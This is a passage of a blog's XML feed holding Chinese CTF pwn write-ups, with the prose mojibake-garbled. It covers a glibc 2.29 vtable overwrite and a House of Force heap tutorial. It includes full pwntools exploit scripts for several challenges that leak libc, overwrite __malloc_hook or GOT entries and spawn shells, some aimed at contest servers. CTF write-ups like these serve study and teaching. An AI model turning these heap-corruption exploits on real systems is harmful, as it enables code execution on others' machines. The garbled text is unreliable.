æŒ‡é’ˆï¼š</p><pre><code>/* The &#39;finish&#39; function does any final cleaning up of an _IO_FILE object.   It does not delete (free) it, but does everything else to finalize it.   It matches the streambuf::~streambuf virtual destructor.  */typedef void (*_IO_finish_t) (FILE *, int); /* finalize */#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)struct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);};</code></pre><p>å¯¹äºæ”»å‡»çš„vtable å‡½æ•° æŒ‡é’ˆå…¶ä¸­çš„ï¼š</p><ul><li><code>__finish__</code></li><li><code>__close</code></li></ul><p>å…¶æ‰§è¡Œé¡ºåºæ˜¯å…ˆcloseï¼Œç„¶åfinishã€‚ç”±äºç¨‹åºç»™çš„æ˜¯0x18å­—èŠ‚çš„ä»»æ„å†™ï¼Œæ”»å‡» <code>__finish__</code>å°±å¯ä»¥äº†ã€‚</p><h4 id="libc2-29ä¸­çš„vtable"><a href="#libc2-29ä¸­çš„vtable" class="headerlink" title="libc2.29ä¸­çš„vtable"></a>libc2.29ä¸­çš„vtable</h4><p>vtableçš„å€¼ï¼Œä»¥åŠå…¶å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨glibc 2.29ä¸‹æ˜¯å¯å†™çš„ã€‚è¿™ä¸ªæ˜¯å¾ˆé‡è¦çš„ä¸€ç‚¹ï¼Œæœ¬æ¥ä¸ªäººä¸çŸ¥é“è¿™ä¸ªï¼Œæƒ³äº†å¥½ä¹…å…¶ä»–çš„åŠæ³•æ¥åˆ©ç”¨ã€‚</p><p><strong>åœ¨glibc 2.23ä»¥åŠglibc 2.27å…¶éƒ½æ˜¯ä¸å¯å†™çš„</strong>ã€‚</p><p>æ­£æ˜¯å› ä¸ºå¯ä»¥å†™ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜éš¾åº¦å°±é™ä½äº†å¾ˆå¤šã€‚</p><h4 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p>åˆ©ç”¨ç¨‹åºçš„æœ€åä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œç›´æ¥æŠŠ<code>__IO_2_1_stderrçš„vtable</code>ä¸Š<code>__finish__</code>æŒ‡é’ˆä¿®æ”¹ä¸ºone gadgetã€‚<br>ï¼ˆè¿™é‡Œçš„one gadgetï¼Œéœ€è¦è‡ªå·±å¤šè¯•ï¼‰ã€‚</p><h5 id="å°tips"><a href="#å°tips" class="headerlink" title="å°tips"></a>å°tips</h5><p>ç¬¬2æ¬¡çš„2å­—èŠ‚è¯»å…¥å¯ä»¥ç›´æ¥ç”¨å…¶æœ¬æ¥åœ°å€æœ«2å­—èŠ‚å³å¯ï¼Œç›´æ¥åœ¨<code>__IO_2_1_stderrçš„vtable</code>ä¸ç”¨è½¬ç§»ä¹Ÿå¯ä»¥çš„ã€‚ï¼ˆçœ‹åˆ°æœ‰åˆ«çš„å¸ˆå‚…è½¬ç§»åˆ°å…¶ä»–vtableåœ°å€çš„ã€‚ï¼‰å¹¶ä¸”ï¼Œç”±äºæ˜¯readå‡½æ•°ï¼Œç›´æ¥å‘ä¸ª<code>\x60</code>ä¸€ä¸ªå­—èŠ‚å³å¯ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#39;remote_libc = &#39;./libc6_2.29-0ubuntu2_amd64.so&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10030)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&quot;0x&quot;)libc_base = int(r(12),16) - libc.symbols[&quot;printf&quot;]info_addr(&quot;libc_base&quot;,libc_base)ru(&quot;addr&quot;)vtable = 0x1e5758 + libc_bases(p64(vtable))sleep(0.1)# debug()s(&#39;\x60&#39;)sleep(0.1)rec = 0xe2386 + libc_bases(p64(0) + p64(0)+p64(rec))itr()</code></pre><p>ç”±äºæå‰å°±<code>fclose(stdout)</code>,getshellä»¥åä¹Ÿä¸ä¼šæœ‰ä»»ä½•çš„è¾“å‡ºï¼Œæ‰€ä»¥å¾—ç”¨<code>exec 1&gt;&amp;2</code>æ¥æ¢å¤è¾“å‡ºã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTFå®‰æ’æœˆèµ›-6th&quot;&gt;&lt;a href=&quot;#DASCTFå®‰æ’æœˆèµ›-6th&quot; class=&quot;headerlink&quot; title=&quot;DASCTFå®‰æ’æœˆèµ›(6th)&quot;&gt;&lt;/a&gt;DASCTFå®‰æ’æœˆèµ›(6th)&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;#R
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>House of Force</title>
    <link href="http://chumen77.xyz/2020/05/13/House%20of%20Force/"/>
    <id>http://chumen77.xyz/2020/05/13/House of Force/</id>
    <published>2020-05-13T13:30:55.952Z</published>
    <updated>2020-09-16T15:23:01.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åŸºæœ¬æŒ‰ç…§è¿™wikiä¸Šé¢å­¦çš„ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p><h3 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h3><ul><li>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li><li>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°<h3 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h3>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼šè¿›è¡Œå †åˆ†é…æ—¶,å¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚,é‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</li></ul><p>æ‰€ä»¥å½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆ?ç­”æ¡ˆæ˜¯,å¯ä»¥ä½¿å¾— top chunkæŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®,è¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚</p><pre><code>// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°victim = av-&gt;top;size   = chunksize(victim);// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}</code></pre><p>æ‰€ä»¥ï¼Œå¦‚æœå¯ä»¥ç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼,å°±å¯ä»¥è½»æ¾çš„é€šè¿‡è¿™ä¸ªéªŒè¯,è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿæ§åˆ¶top chunk size åŸŸçš„æ¼æ´ã€‚</p><h2 id="ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•"><a href="#ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•" class="headerlink" title="ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•"></a>ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p><pre><code>remainder      = chunk_at_offset(victim, nb);av-&gt;top        = remainder;/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</code></pre><p>ä¹‹åè¿™é‡Œä¼šæŠŠ top chunkçš„ æŒ‡é’ˆæ›´æ–°ï¼Œæ¥ä¸‹æ¥çš„å †å—å°±ä¼šåˆ†é…åˆ°è¿™ä¸ªä½ç½®ï¼Œç”¨æˆ·åªè¦æ§åˆ¶äº†è¿™ä¸ªæŒ‡é’ˆå°±ç›¸å½“äºå®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼(write-anything-anywhere)ã€‚</p><h2 id="ç®€å•å®ä¾‹"><a href="#ç®€å•å®ä¾‹" class="headerlink" title="ç®€å•å®ä¾‹"></a>ç®€å•å®ä¾‹</h2><h3 id="è®©top-chunk-çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢-ä½åœ°å€-çš„gotè¡¨ä¸­çš„å†…å®¹"><a href="#è®©top-chunk-çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢-ä½åœ°å€-çš„gotè¡¨ä¸­çš„å†…å®¹" class="headerlink" title="è®©top chunk çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„gotè¡¨ä¸­çš„å†…å®¹"></a>è®©top chunk çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„gotè¡¨ä¸­çš„å†…å®¹</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æ¥ç¼©å°top chunk çš„æŒ‡é’ˆï¼Œæ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„æŸå¤„ä¸­çš„å†…å®¹ã€‚è¿™é‡Œå¯èƒ½æ˜¯heapçš„æŒ‡é’ˆï¼Œgotè¡¨ã€‚<strong>é€šå¸¸åº”è¯¥éƒ½æ˜¯æ‰“heapï¼Œå› ä¸ºheapçš„åœ°å€æ˜¯ç›¸å¯¹çš„ï¼Œä¸ä¼šæ”¶åˆ°åœ°å€éšæœºåŒ–çš„å½±å“ã€‚è€Œæ‰“gotçš„è¯ï¼Œå †çš„åœ°å€æ˜¯éšæœºçš„ï¼Œå¹¶æ— æ³•ç¡®å®šç”³è¯·å¤šå°‘size å¤§å°çš„å †ï¼Œå¯ä»¥æ”»å‡»åˆ°got</strong></p><p><strong>è¿™å…¶ä¸­æœ‰ä¸ªéš¾ç¼ çš„é—®é¢˜å°±æ˜¯ç»“æ„ä½“å¯¹é½é—®é¢˜ï¼Œç›®å‰æˆ‘æ‰€ç»ƒä¹ åˆ°çš„é¢˜é‡åˆ°è¿™ä¸ªé—®é¢˜çš„éƒ½æ˜¯ï¼Œå‡å»ä¸€ä¸‹<code>SIZE_SZ</code>ï¼ˆ64ä½æ˜¯8 ï¼Œ32ä½æ˜¯4ï¼‰ã€‚</strong></p><h3 id="è®©é‚£ä¸ªtop-chunk-æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹"><a href="#è®©é‚£ä¸ªtop-chunk-æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹" class="headerlink" title="è®©é‚£ä¸ªtop chunk æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹"></a>è®©é‚£ä¸ªtop chunk æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªæ˜¯è¾ƒå¥½ç†è§£çš„ï¼Œå¸¸ç”¨ä¿®æ”¹libcä¸Šé¢æŸå¤„çš„åœ°å€ã€‚</p><h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>ä¸»è¦æ˜¯ä¿®æ”¹ä¸€ä¸‹ï¼Œå¼€å§‹ç¨‹åºè‡ªåŠ¨åˆ›å»ºçš„å­˜æ”¾2ä¸ªå‡½æ•°æŒ‡é’ˆçš„å †ï¼Œå…¶ä¸­hello-messageç”¨äºç¨‹åºå¼€å§‹æ—¶ä½¿ç”¨ï¼Œgoodbye-message ç”¨äºåœ¨ç¨‹åºç»“æŸæ—¶ä½¿ç”¨ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>æ·»åŠ å †å—ï¼Œåˆ©ç”¨å †æº¢å‡ºæ¼æ´è¦†ç›– top chunk çš„å¤§å°ä¸º -1ï¼Œå³ 64 ä½æœ€å¤§å€¼ã€‚</li><li>åˆ©ç”¨ house of force æŠ€å·§ï¼Œåˆ†é… chunk è‡³å †çš„åŸºåœ°å€ã€‚</li><li>è¦†ç›– goodbye-message ä¸ºmagic å‡½æ•°åœ°å€æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bamboobox&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 1if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25784)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;item name:&#39;,str(size))    sa(&#39;item&#39;,str(content))def free(id):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;item&#39;,str(id))def show(id):    sla(&#39;choice&#39;,&#39;1&#39;)def edit(id,size,content):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;item&#39;,str(id))    sla(&#39;item name&#39;,str(size))    sa(&#39;item&#39;,str(content))context.log_level = &#39;debug&#39;magic = 0x400d49add(0x30,&#39;chum&#39;)payload = &#39;a&#39; * 0x30 +p64(0) + p64(0xffffffffffffffff)edit(0,0x40,payload)size = -(0x40 + 0x20) - 0x10add(size,&#39; &#39;)payload = p64(0x400d49) + p64(0x400d49)add(0x10,payload)# sla(&#39;choice:&#39;,&#39;5&#39;)itr()</code></pre><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf-2020-force"></a>gyctf-2020-force</h2><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/uYKO6A.png" srcset="/img/loading.gif" alt><br>å¯ä»¥å®ç°å †æº¢å‡ºã€‚å¹¶ä¸”åœ¨ä½ ç”³è¯·ä¸€ä¸ªå †å—ä»¥åï¼Œç¨‹åºä¼šç»™ä½ æ‰“å°å‡ºå †å—çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥æ³„éœ²å‡ºä¿¡æ¯ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>ç”³è¯·ä¸€ä¸ªå¾ˆå¤§å †ï¼Œç„¶åç¨‹åºä¼šmmapå¼€å¯ä¸€ä¸ªå †å—ï¼Œæ­¤æ—¶å°±å¯ä»¥æ³„æ¼å‡ºlibcçš„åœ°å€ã€‚</li><li>HOF</li><li><code>__malloc_hook</code> + one gadget</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;local_file  = &#39;./gyctf_2020_force&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29457)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,date):    sla(&#39;2:puts&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    ru(&#39;bin addr 0x&#39;)    heapaddr = int(r(12),16)    info_addr(&#39;heapaddr&#39;,heapaddr)    sa(&#39;content&#39;,str(date))    return heapaddrpayload = 0x30 * &#39;a&#39; + p64(0) + p64(0xffffffffffffffff)libc_base = add(0x200000,&#39;111&#39;) + 0x200ff0info_addr(&#39;libc_base&#39;,libc_base)malloc_hook = libc_base + 0x3c4b10heapaddr = add(0x30,payload)size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8print(&#39;size----&gt;&#39;+hex(size))add(size,&#39;a&#39;)rce = rce16[1] + libc_basepayload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[&#39;__libc_realloc&#39;] + realloc[1])add(0x20,payload)sla(&#39;2:puts&#39;,&#39;1&#39;)sla(&#39;size&#39;,&#39;30&#39;)# dbg()itr()</code></pre><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><code>bcloud_bctf_2016</code></h2><p>è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªååˆ†ç²¾å¦™çš„é¢˜ï¼Œæ¼æ´å‡ºç°åœ¨ç¨‹åºåˆå§‹åŒ–ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/JMsnrt.png" srcset="/img/loading.gif" alt></p><p>strcpyæ˜¯ä»¥<code>\x00</code>æ¥åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç»“æŸçš„ã€‚<br>åœ¨æ ˆä¸­ï¼Œå½“è¾“å…¥0x40ä¸ªå­—ç¬¦æ—¶ï¼Œå› ä¸ºv2æ­£å¥½åœ¨sä¸‹é¢ï¼Œè¿™å°±è®©strcpyä»så¾€v2ä¸Šé¢å¤åˆ¶æ—¶ä¼š<strong>æŠŠè¿™ä¸ªå †å—çš„åœ°å€ä¹Ÿç»™å¤åˆ¶ä¸Šå»</strong>ï¼Œå½“å…¶è¿”å›nameæ—¶ï¼Œä¹Ÿå°±è¿”å›äº†å †å—åœ°å€ï¼Œç„¶åå°±å¯ä»¥ç®—å‡ºå †å—çš„åŸºåœ°å€ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/5n1Rtx.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BGZjNT.png" srcset="/img/loading.gif" alt></p><p>åˆ°äº†è¿™ä¸ªä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´ï¼Œå¡«å……å®Œ0x40ä¸ªå­—ç¬¦åï¼Œä¼šæŠŠorgå †å—çš„æŒ‡é’ˆå’Œv3é‡Œé¢çš„å†…å®¹ç»™å¤åˆ¶åˆ°orgå¯¹åº”çš„å †å—é‡Œï¼Œä¹Ÿå°±æ˜¯0x40 + 4 + len(v3)å­—èŠ‚çš„ä¸œè¥¿ã€‚orgåœ¨å †å—æ’å¸ƒä¸­ä¹Ÿæ˜¯æœ€åä¸€ä¸ªï¼Œå¦‚æœä¼ è¿‡å»<code>0xffffffff</code>,å°±å¯ä»¥æ”¹åˆ°top chunkçš„sizeä½ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯-2"><a href="#åˆ©ç”¨æ€è·¯-2" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>leakå †å—base</li><li>ä¿®æ”¹top chunk size</li><li>hofåˆ°heaplistå¤„</li><li>ç»™heaplistå†™ä¸Šfree gotï¼Œç”¨editï¼Œä¿®æ”¹å…¶ä¸ºputs</li><li>æ³„æ¼libcåœ°å€</li><li>ä¿®æ”¹free got ä¸ºsystemï¼Œç„¶åæŒ‡å‘<code>/bin/sh\x00</code></li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timelocal_file  = &#39;./bcloud_bctf_2016&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27301)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def name(name):    sa(&#39;name&#39;,str(name))    ru(&#39;b&#39;)    heapbase = uu32(r(4)) - 0x8    info_addr(&#39;heapbase&#39;,heapbase)    return heapbasedef org(org,host):    sa(&#39;Org:&#39;,str(org))    sla(&#39;Host:&#39;,str(host))def add(size,content):    sla(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;length&#39;,str(size))    sa(&#39;content:&#39;,str(content))def edit(id,content):    sla(&#39;---&gt;&gt;&#39;,&#39;3&#39;)    sla(&#39;id&#39;,str(id))    sa(&#39;the new content&#39;,str(content))def free(id):    sla(&#39;-&gt;&#39;,&#39;4&#39;)    sla(&#39;id&#39;,str(id))context.log_level = &#39;debug&#39;sizelist = 0x804B0A0heaplist = 0x804B120heapbase = name(&#39;a&#39; * (0x40-1) + &#39;b&#39;)top = heapbase + 0xd8info_addr(&#39;top&#39;,top)org(&#39;b&#39;*0x40,p32(0xffffffff)) #chang top chunk sizesize = heaplist - top - 0x10add(size,&#39;\n&#39;)add(0x18,&#39;\n&#39;)payload = p32(0) + p32(elf.got[&#39;free&#39;]) + p32(elf.got[&#39;atoi&#39;])  +p32(0x804B128+4+4) + &#39;/bin/sh\x00&#39;edit(1,payload + &#39;\n&#39;)puts_plt = elf.plt[&#39;puts&#39;]edit(1,p32(puts_plt) + &#39;\n&#39;)free(2)io.recv(1)io.recv(1)atoi = uu32(r(4))info_addr(&#39;atoi&#39;,atoi)libc = LibcSearcher(&#39;atoi&#39;,atoi)libc_base = atoi - libc.dump(&#39;atoi&#39;)system = libc_base + libc.dump(&#39;system&#39;)info_addr(&#39;libc_base&#39;,libc_base)edit(1,p32(system) + &#39;\n&#39;)free(3)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Force&quot;&gt;&lt;a href=&quot;#House-of-Force&quot; class=&quot;headerlink&quot; title=&quot;House of Force&quot;&gt;&lt;/a&gt;House of Force&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="Houseç³»åˆ—" scheme="http://chumen77.xyz/tags/House%E7%B3%BB%E5%88%97/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(4th)</title>
